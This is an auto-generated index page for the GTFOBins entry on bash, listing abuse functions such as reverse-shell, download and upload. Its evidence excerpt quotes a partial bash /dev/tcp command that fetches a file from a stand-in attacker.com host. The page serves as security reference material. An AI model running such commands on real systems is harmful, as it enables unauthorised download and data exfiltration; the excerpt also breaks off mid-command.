---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# bash

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `bash` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bash` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for bash covering download, file-read, file-write, library-load, reverse-shell, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/bash.md)
- Source verification: [source record](../../sources/gtfobins/bash.md)

## Aliases

- `bash`

## Source Verification

[source record](../../sources/gtfobins/bash.md)

## Evidence Excerpt

```text
_body: ''
_name: bash
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bash
functions:
download:
- binary: false
code: "bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; }\
\ \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break;\
```
